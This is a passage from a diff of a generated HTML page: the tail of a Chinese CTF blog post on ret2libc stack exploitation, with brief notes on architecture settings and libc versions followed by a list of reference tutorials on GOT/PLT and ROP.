+比如x86程序选<code>i386</code>，x64程序则选<code>x86_64</code>或<code>amd64</code>（之前怎么没想到，被自己蠢晕.jpg）
+但是不知道什么原因我并没有找到可以getshell的正确版本（可以看到我至少用两个函数试了三个libc版本），比较奇怪</p>
+<p>整体思路明白就行，等哪天全部解决了再回来pwn一次
+已解决，感动死了（悲）</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1"><em>CTFwiki</em></a></p>
+</li>
+<li>
+<p>CSDN</p>
+<ul>
+<li><em><a href="https://blog.csdn.net/prettyX/article/details/107404509">PWN基础15：GOT表 和 PLT表</a></em></li>
+<li><em><a href="https://blog.csdn.net/xiangbaohui/article/details/122547009">浅谈GOT表与PLT表</a></em></li>
+<li><em><a href="https://blog.csdn.net/yulicong520/article/details/124177035">函数打桩原理</a></em></li>
+<li><em><a href="https://blog.csdn.net/qq_40827990/article/details/86662079">Ret2libc</a></em></li>
+<li><em><a href="https://blog.csdn.net/weixin_44864859/article/details/106213468">Ret2libc 1</a></em></li>
+<li><em><a href="https://blog.csdn.net/AcSuccess/article/details/104321534">基本ROP之ret2libc2</a></em></li>
+<li><em><a href="https://blog.csdn.net/acsuccess/article/details/104335514">基本ROP之ret2libc3</a></em></li>
+</ul>
+</li>
+<li>
+<p>知乎</p>
+<ul>
+<li><em><a href="https://zhuanlan.zhihu.com/p/130271689">深入理解GOT表和PLT表</a></em></li>
+<li><em><a href="https://zhuanlan.zhihu.com/p/367387964">Pwn教学 &mdash;&ndash; Ret2libc</a></em></li>
+<li><em><a href="https://zhuanlan.zhihu.com/p/464311858">CTFer成长日记10：动态链接的基本过程与ret2libc</a></em></li>
+<li><em><a href="https://zhuanlan.zhihu.com/p/25892385">手把手教你栈溢出</a></em></li>
+</ul>
+</li>
+<li>
+<p>简书</p>
+<ul>
+<li><em><a href="https://www.jianshu.com/p/aa7c96b72342">PWN</a><a href="https://www.jianshu.com/p/aa7c96b72342">实验</a></em></li>
+<li><em><a href="https://www.jianshu.com/p/4928e726a43f">pwn — ret2libc2</a></em></li>
+<li><em><a href="https://www.jianshu.com/p/c4780335b842">ret2libc2</a></em></li>
+</ul>
+</li>
+<li>
+<p>BLOG</p>
+<ul>
+<li><a href="https://www.cnblogs.com/lordtianqiyi/articles/16298637.html"><em>pwn_栈溢出之GOT，PLT表基础</em></a></li>
+</ul>
+</li>
+</ul>
+
+            </div>
+        </article>
+
+
+
+
+
+<br>
+<script src="https://utteranc.es/client.js"
+        repo="ASUKA39/asuka39.github.io"
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script></main>
+</div>
+<footer class="footer">
+    
+
+    
+    
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
